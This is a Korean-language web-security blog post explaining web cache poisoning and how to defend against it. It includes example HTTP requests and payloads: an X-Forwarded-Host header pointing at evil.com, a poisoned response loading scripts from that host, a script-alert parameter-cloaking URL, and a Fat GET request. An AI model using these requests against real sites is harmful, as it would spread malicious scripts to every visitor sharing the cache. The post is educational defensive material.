---
title: "웹 캐시 포이즈닝: CDN을 무기로 바꾸는 공격"
description: "캐시 서버의 unkeyed 입력 취약점을 이용해 오염된 응답을 전체 방문자에게 전파하는 웹 캐시 포이즈닝의 원리, 공격 기법, Cache-Control과 Vary 헤더를 활용한 방어 전략을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-06"
archiveOrder: 1
type: "knowledge"
category: "Security"
tags: ["웹보안", "캐시포이즈닝", "CDN", "XSS", "Cache-Control"]
featured: false
draft: false
---

[지난 글](/posts/websec-http-request-smuggling/)에서 HTTP 요청 스머글링이 프록시 간 불일치를 악용하는 방식을 살펴봤다. 이번에는 그와 밀접한 관계가 있는 **웹 캐시 포이즈닝(Web Cache Poisoning)**을 다룬다. 공격자가 단 한 번의 조작된 요청으로 캐시 서버를 오염시키면, 이후 수천 명의 방문자가 악성 응답을 받게 된다.

## 캐시가 왜 위험해지는가

CDN과 리버스 프록시는 성능 향상을 위해 서버 응답을 캐싱한다. 캐시는 **캐시 키(Cache Key)**를 기준으로 응답을 저장하고 반환한다. 기본 캐시 키는 보통 `Host + URL`이다.

문제는 응답 생성에 영향을 주지만 캐시 키에는 포함되지 않는 입력이 존재할 때 발생한다. 이런 입력을 **unkeyed 입력**이라 한다. 대표적인 예가 `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL` 같은 헤더들이다.

서버가 이 헤더 값을 응답에 그대로 반영(예: `<base href="...">`)하면서 캐시 키에는 포함시키지 않으면, 공격자는 조작된 값을 주입해 오염된 응답을 캐시에 저장시킬 수 있다.

![웹 캐시 포이즈닝 공격 흐름](/assets/posts/websec-web-cache-poisoning-flow.svg)

## 공격 단계

**1단계 — unkeyed 입력 탐지**

공격자는 다양한 헤더를 보내며 응답이 달라지는지 관찰한다:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

응답에 `attacker.com`이 포함된다면 unkeyed 입력이 존재하는 것이다.

**2단계 — 응답 캐싱 조건 확인**

응답 헤더에서 `Cache-Control: public`, `Age:`, `X-Cache: HIT` 등을 확인해 캐시가 활성화돼 있는지 검증한다.

**3단계 — 오염된 응답 주입**

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
<base href="//evil.com/">
<script src="/app.js"></script>
```

위 응답이 캐시에 저장되면, 이후 일반 사용자가 `GET /`를 요청해도 같은 캐시된 악성 응답을 받는다. 스크립트 경로가 `evil.com` 기준이 되어 XSS가 실행된다.

## 주요 공격 변형

**Parameter Cloaking**

일부 캐시는 쿼리 파라미터를 캐시 키에서 제외한다. 정규화 방식 차이를 이용한다:

```
GET /js/app.js?evil=<script>alert(1)</script>
```

캐시는 `?evil=...`를 무시하고 `/js/app.js`로 저장하지만, 오리진 서버는 파라미터를 응답에 반영한다.

**Fat GET**

일부 서버는 GET 요청의 바디도 처리한다:

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 18

param=injected_val
```

**캐시 키 정규화 악용**

URL을 `/api/v1/../admin`처럼 보내면 캐시는 원본 경로로 저장하지만 서버는 `/admin`으로 라우팅한다.

## 영향 범위

캐시 포이즈닝은 한 명의 사용자가 아닌 **캐시를 공유하는 모든 사용자**가 피해를 입는다는 점에서 반사형 XSS보다 훨씬 위험하다. 캐시 TTL 동안 지속되므로 공격자가 자리를 비워도 공격이 유지된다.

가능한 공격 결과:
- **Stored XSS**: 악성 스크립트가 전체 방문자에게 실행
- **세션 탈취**: 쿠키 탈취 스크립트 주입
- **자격증명 피싱**: 로그인 폼 리다이렉트
- **DoS**: 캐시에 오류 응답 저장

## 방어 전략

![캐시 키 설계와 방어 전략](/assets/posts/websec-web-cache-poisoning-defense.svg)

**1. 응답에 unkeyed 입력을 반영하지 않는다**

가장 근본적인 방어다. `X-Forwarded-Host` 같은 헤더 값을 응답 HTML에 직접 출력하지 않는다. 필요하다면 서버 설정 파일에서 고정값을 사용한다.

**2. Vary 헤더로 캐시 키 확장**

응답에 영향을 주는 헤더를 `Vary`에 명시하면 캐시가 해당 헤더 값별로 응답을 분리 저장한다:

```http
Vary: Accept-Encoding, Accept-Language
```

단, `Vary: *`는 캐시를 완전히 비활성화하므로 성능에 영향을 준다.

**3. Cache-Control로 민감 응답 캐시 금지**

사용자별로 다른 응답이나 동적 콘텐츠는 캐시하지 않는다:

```http
Cache-Control: no-store, private
Pragma: no-cache
```

**4. CDN 설정에서 위험 헤더 제거**

Cloudflare, Fastly 등에서는 업스트림으로 전달하기 전에 의심스러운 헤더를 제거하도록 설정할 수 있다:

```nginx
# Nginx에서 upstream 전달 전 헤더 제거
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";
```

**5. 허용 목록(allowlist) 기반 검증**

불가피하게 호스트 정보를 사용해야 한다면 반드시 허용 목록으로 검증한다:

```javascript
const ALLOWED_HOSTS = ['app.example.com', 'www.example.com'];
const host = req.headers['x-forwarded-host'] || req.headers['host'];
if (!ALLOWED_HOSTS.includes(host)) {
  throw new Error('Invalid host');
}
```

## 탐지와 테스트

Burp Suite의 **Param Miner** 확장 플러그인은 unkeyed 입력 자동 탐지에 효과적이다. 응답 헤더의 `Age`와 `X-Cache` 값의 변화를 관찰하면 캐시 동작 방식을 파악할 수 있다. 캐시 버스터(`?cb=<random>`)를 파라미터로 추가하면 이전 캐시와 격리해 테스트할 수 있다.

---

**지난 글:** [HTTP 요청 스머글링: 프록시 간 불일치 악용](/posts/websec-http-request-smuggling/)

**다음 글:** [Host 헤더 인젝션](/posts/websec-host-header-injection/)

<br>
읽어주셔서 감사합니다. 😊
